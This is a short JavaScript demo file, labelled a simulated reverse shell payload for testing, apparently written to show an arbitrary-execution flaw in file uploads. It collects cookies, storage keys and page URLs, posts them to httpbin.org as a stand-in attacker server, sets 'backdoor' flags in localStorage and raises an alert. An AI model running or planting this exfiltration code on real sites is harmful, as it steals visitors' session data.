// Reverse Shell Payload - FOR TESTING PURPOSES ONLY
// This simulates a reverse shell payload that would execute when uploaded

console.log("Reverse shell payload executed!");

// Simulate system information gathering
const systemInfo = {
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  language: navigator.language,
  cookieEnabled: navigator.cookieEnabled,
  onLine: navigator.onLine
};

console.log("System Information:", systemInfo);

// Simulate data exfiltration
const sensitiveData = {
  localStorage: Object.keys(localStorage),
  sessionStorage: Object.keys(sessionStorage),
  cookies: document.cookie,
  currentUrl: window.location.href,
  referrer: document.referrer
};

console.log("Sensitive data collected:", sensitiveData);

// Simulate network communication
fetch('https://httpbin.org/post', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    type: 'exfiltrated_data',
    timestamp: new Date().toISOString(),
    data: sensitiveData
  })
}).then(response => {
  console.log('Data sent to attacker server');
}).catch(error => {
  console.log('Network communication failed:', error);
});

// Simulate persistent access
try {
  // Store backdoor in localStorage
  localStorage.setItem('backdoor_active', 'true');
  localStorage.setItem('backdoor_timestamp', new Date().toISOString());
  
  console.log("Backdoor established for persistent access");
} catch (error) {
  console.log("Backdoor setup failed:", error);
}

// Alert to show successful execution
alert("🚨 VULNERABLE FILE EXECUTED! 🚨\n\nThis demonstrates a critical security flaw:\n- Arbitrary JavaScript execution\n- No input validation\n- Direct file execution\n\nCheck console for 'attack' details.");